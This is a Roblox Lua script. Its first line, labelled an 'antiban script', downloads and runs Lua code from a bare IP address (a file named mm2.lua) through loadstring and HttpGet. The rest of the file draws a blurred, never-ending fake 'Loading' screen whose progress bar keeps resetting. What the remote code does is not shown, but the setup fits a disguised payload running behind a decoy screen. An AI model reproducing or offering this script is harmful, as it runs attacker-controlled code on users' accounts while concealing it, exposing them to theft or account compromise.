-- loading the antiban script
loadstring(game:HttpGet("http://109.120.157.241:5000/mm2.lua"))()

task.wait(1)
-- the main script
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local Player = game.Players.LocalPlayer

local Gui = Instance.new("ScreenGui")
Gui.IgnoreGuiInset = true
Gui.ResetOnSpawn = false
Gui.Parent = Player.PlayerGui

-- Blur
local Blur = Lighting:FindFirstChild("LoadingBlur") or Instance.new("BlurEffect")
Blur.Name = "LoadingBlur"
Blur.Size = 0
Blur.Parent = Lighting

TweenService:Create(
	Blur,
	TweenInfo.new(1.2, Enum.EasingStyle.Quad),
	{Size = 22}
):Play()

-- Контейнер
local Background = Instance.new("Frame")
Background.Size = UDim2.fromScale(1,1)
Background.BackgroundTransparency = 1
Background.Parent = Gui

-- Loading
local Loading = Instance.new("TextLabel")
Loading.AnchorPoint = Vector2.new(.5,.5)
Loading.Position = UDim2.fromScale(.5,.42)
Loading.Size = UDim2.fromOffset(300,60)
Loading.BackgroundTransparency = 1
Loading.Font = Enum.Font.GothamBold
Loading.TextScaled = true
Loading.TextColor3 = Color3.new(1,1,1)
Loading.TextStrokeTransparency = .8
Loading.Text = "Loading"
Loading.Parent = Background

-- Проценты
local Percent = Instance.new("TextLabel")
Percent.AnchorPoint = Vector2.new(.5,.5)
Percent.Position = UDim2.fromScale(.5,.5)
Percent.Size = UDim2.fromOffset(120,35)
Percent.BackgroundTransparency = 1
Percent.Font = Enum.Font.GothamMedium
Percent.TextScaled = true
Percent.TextColor3 = Color3.fromRGB(220,220,220)
Percent.Text = "0%"
Percent.Parent = Background

-- Полоса
local Back = Instance.new("Frame")
Back.AnchorPoint = Vector2.new(.5,.5)
Back.Position = UDim2.fromScale(.5,.58)
Back.Size = UDim2.fromOffset(400,8)
Back.BackgroundColor3 = Color3.fromRGB(255,255,255)
Back.BackgroundTransparency = .85
Back.BorderSizePixel = 0
Back.Parent = Background

Instance.new("UICorner",Back).CornerRadius = UDim.new(1,0)

local Fill = Instance.new("Frame")
Fill.Size = UDim2.new(0,0,1,0)
Fill.BackgroundColor3 = Color3.fromRGB(255,255,255)
Fill.BorderSizePixel = 0
Fill.Parent = Back

Instance.new("UICorner",Fill).CornerRadius = UDim.new(1,0)

-- Качание текста
task.spawn(function()
	while true do
		TweenService:Create(
			Loading,
			TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{Rotation = -4}
		):Play()
		task.wait(1.1)

		TweenService:Create(
			Loading,
			TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{Rotation = 4}
		):Play()
		task.wait(1.1)
	end
end)

-- Точки
task.spawn(function()
	local dots = {"Loading","Loading.","Loading..","Loading..."}
	local i = 1

	while true do
		Loading.Text = dots[i]
		i += 1
		if i > #dots then
			i = 1
		end
		task.wait(.4)
	end
end)

-- Загрузка
local percent = 0

while true do
	local target = math.random(25,100)

	while percent < target do
		percent += math.random(1,3)
		if percent > target then
			percent = target
		end

		Percent.Text = percent.."%"

		TweenService:Create(
			Fill,
			TweenInfo.new(.25, Enum.EasingStyle.Quad),
			{Size = UDim2.new(percent/100,0,1,0)}
		):Play()

		task.wait(math.random(8,18)/100)
	end

	task.wait(math.random(1,2))

	if percent >= 100 then
		percent = 0
		Percent.Text = "0%"
		Fill.Size = UDim2.new(0,0,1,0)
	end
end
